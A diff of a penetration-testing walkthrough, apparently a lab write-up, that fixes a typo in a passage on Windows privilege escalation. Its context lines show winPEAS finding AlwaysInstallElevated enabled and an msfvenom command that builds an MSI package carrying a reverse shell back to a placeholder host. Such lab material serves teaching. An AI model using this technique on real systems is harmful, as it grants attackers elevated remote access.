@@ -54,7 +54,7 @@ Let's run the following command
 <div class="alert-info">.\winPEAS.exe windowscreds</div>
 ![image](/assets/img/winpeas-windowscreds.png)
 The results shows us that AlwaysInstallElevated is set to 1 in both HKLM and HKCU!
-This means that .MSI packages are installed with eleveated system privileges.
+This means that .MSI packages are installed with elevated system privileges.
 
 We now can run the following msfvenom commannd to create a payload with a reverse shell in it.
 <div class="alert-info">msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi -o reverse.msi</div>
